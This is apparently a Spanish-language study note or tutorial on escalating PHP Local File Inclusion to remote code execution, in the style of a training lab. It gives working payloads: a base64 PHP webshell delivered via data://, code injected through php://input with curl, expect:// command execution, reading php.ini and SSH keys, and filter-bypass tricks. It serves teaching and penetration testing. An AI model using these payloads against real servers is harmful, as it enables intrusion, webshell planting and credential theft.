
Hasta ahora, una vulnerabilidad de _Local File Inclusion (LFI)_ nos ha permitido leer archivos locales del sistema. A partir de este punto, el objetivo cambia: **utilizar la LFI para ejecutar código en el servidor**, lo que se traduce en una _Remote Code Execution (RCE)_.

Existen dos maneras generales de conseguirlo:

1. **Métodos indirectos**: Aprovechar la lectura de archivos para obtener credenciales, llaves SSH, passwords reutilizadas, etc.  
    Por ejemplo:
    
    - `config.php` → credenciales MySQL que coinciden con credenciales del sistema.
        
    - `~/.ssh/id_rsa` con permisos débiles → acceso SSH directo.
        
2. **Métodos directos**: Aprovechar funciones vulnerables y _wrappers de PHP_ para conseguir ejecutar comandos sin necesidad de credenciales.
    

En esta sección tratamos estos **métodos directos**, centrándonos en wrappers PHP especialmente útiles para explotar LFI.

---

# **1. Introducción a los PHP Wrappers útiles para RCE**

Los wrappers son protocolos internos de PHP que permiten tratar archivos o datos como recursos especiales:  
`php://`, `data://`, `zip://`, `phar://`, `expect://`, etc.

Para _LFI → RCE_, los tres que más se utilizan inicialmente son:

|Wrapper|Requiere allow_url_include|Método|
|---|---|---|
|`data://`|Sí|Incluir código PHP inyectado|
|`php://input`|Sí|Incluir código enviado por POST|
|`expect://`|No necesariamente (pero sí extensión expect)|Ejecuta comandos directamente|

---

# **2. Comprobando si podemos atacar: allow_url_include**

Muchos ataques basados en wrappers requieren que PHP tenga activada la opción:

```
allow_url_include = On
```

Esta directiva está **deshabilitada por defecto**, por lo que es esencial comprobarla.

## **Localizando php.ini mediante LFI**

PHP suele ubicarse en rutas como:

- Apache: `/etc/php/X.Y/apache2/php.ini`
    
- PHP-FPM: `/etc/php/X.Y/fpm/php.ini`
    
- CLI: `/etc/php/X.Y/cli/php.ini`
    

### Ejemplo real usando LFI con filtro base64

```bash
curl "http://<IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Decodeamos y buscamos la directiva:

```bash
echo 'BASE64…' | base64 -d | grep allow_url_include
```

Salida:

```
allow_url_include = On
```

Con esto confirmamos que podemos usar wrappers que ejecuten código.

---

# **3. RCE usando el wrapper data:// (si allow_url_include = On)**

`data://` permite incluir datos arbitrarios como si fueran un archivo.  
Si esos datos contienen **código PHP**, PHP lo ejecutará.

### **Paso 1: Crear un webshell en base64**

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Ejemplo de salida:

```
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

### **Paso 2: URL-encodear la cadena base64**

(`=` → `%3D`, `+` → `%2B`…)

### **Paso 3: Montar el ataque**

```
http://<IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

### **Salida típica:**

```
uid=33(www-data) gid=33(www-data)
```

👉 Este método funciona en aplicaciones antiguas de WordPress, Joomla y aplicaciones PHP legacy donde esta directiva se habilita sin querer.

---

# **4. RCE usando php://input (POST) – Muy útil si no controlamos GET**

`php://input` permite que lo que enviemos en el cuerpo de la petición POST sea tratado como un archivo PHP a incluir.

### **Requisitos**:

- `allow_url_include = On`
    
- El parámetro vulnerable debe aceptar cadenas tipo `?language=php://input`
    
- El servidor debe aceptar POST en ese endpoint
    

### **Ejemplo práctico**

```bash
curl -s -X POST \
     --data '<?php system($_GET["cmd"]); ?>' \
     "http://<IP>:<PORT>/index.php?language=php://input&cmd=id"
```

Salida:

```
uid=33(www-data) gid=33(www-data)
```

### Nota

Si el endpoint _solo acepta POST_ (no GET), podemos incrustar directamente el comando:

```php
<?php system("id"); ?>
```

y se ejecutará igual.

---

# **5. RCE usando expect:// (si está instalado)**

`expect://` es un wrapper menos común, pero extremadamente poderoso.  
Fue diseñado para ejecutar comandos del sistema desde PHP.

### **Cómo saber si está disponible**

Igual que antes: buscar en php.ini:

```bash
grep expect php.ini
```

Salida típica:

```
extension=expect
```

Si está habilitado, ya tenemos RCE directo.

### **Ejemplo de ataque**

```
http://<IP>:<PORT>/index.php?language=expect://id
```

Salida:

```
uid=33(www-data) gid=33(www-data)
```

### **Ejemplo práctico real**

Este wrapper se observa a veces en:

- Aplicaciones internal-only donde devs instalaron expect para automatizar tareas SSH
    
- Servidores donde se utiliza `expect` para automatizar backups remotos
    
- Sistemas industriales o scripts legacy heredados
    

---

# **6. Cosas que suelen causar que estos ataques fallen (casos reales)**

### ✔ **El código vulnerable usa `include_once`**

Si ya has incluido algo antes, puede no volver a cargar tu payload.  
Solución: busca otro parámetro o fuerza rutas diferentes.

### ✔ **Magic Quotes o filtros anti-URL**

Algunas aplicaciones filtran:

- `://`
    
- palabras como `php`, `data`, etc.
    

Solución: doble URL-encoding, null byte (`%00` en versiones antiguas) o técnicas de bypass.

### ✔ **allow_url_include está Off**

Puedes intentar:

- `php://input`
    
- `php://filter`
    
- ataques basados en log poisoning
    
- `phar://`
    
- `zip://`
    
- upload → RCE
    